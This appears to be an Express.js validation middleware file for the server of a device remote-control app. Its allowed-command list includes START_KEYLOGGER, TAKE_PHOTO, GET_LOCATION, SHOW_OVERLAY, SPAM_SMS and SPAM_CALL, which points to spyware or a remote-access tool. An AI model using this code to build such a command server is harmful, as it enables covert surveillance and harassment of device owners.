const { validationResult } = require('express-validator');

const validate = (req, res, next) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({
      success: false,
      error: 'Validation Error',
      errors: errors.array().map(err => ({
        field: err.path,
        message: err.msg
      }))
    });
  }
  next();
};

// Custom validation rules
const isValidObjectId = (value) => {
  const mongoose = require('mongoose');
  return mongoose.Types.ObjectId.isValid(value);
};

const isValidDeviceId = (deviceId) => {
  const regex = /^[a-zA-Z0-9\-_]{8,64}$/;
  return regex.test(deviceId);
};

const isValidPin = (pin) => {
  const regex = /^\d{6}$/;
  return regex.test(pin);
};

const isValidCommandType = (commandType) => {
  const validCommands = [
    'OPEN_WEB', 'TAKE_PHOTO', 'START_KEYLOGGER', 'STOP_KEYLOGGER',
    'GET_LOCATION', 'LOCK_DEVICE', 'UNLOCK_DEVICE', 'SHOW_OVERLAY',
    'HIDE_OVERLAY', 'SEND_NOTIFICATION', 'MAKE_CALL', 'SEND_SMS',
    'SPAM_SMS', 'SPAM_CALL', 'SEND_WHATSAPP', 'SET_BRIGHTNESS',
    'SET_VOLUME', 'SET_SILENT_MODE', 'TOGGLE_WIFI', 'TOGGLE_BLUETOOTH'
  ];
  return validCommands.includes(commandType);
};

module.exports = {
  validate,
  isValidObjectId,
  isValidDeviceId,
  isValidPin,
  isValidCommandType
};
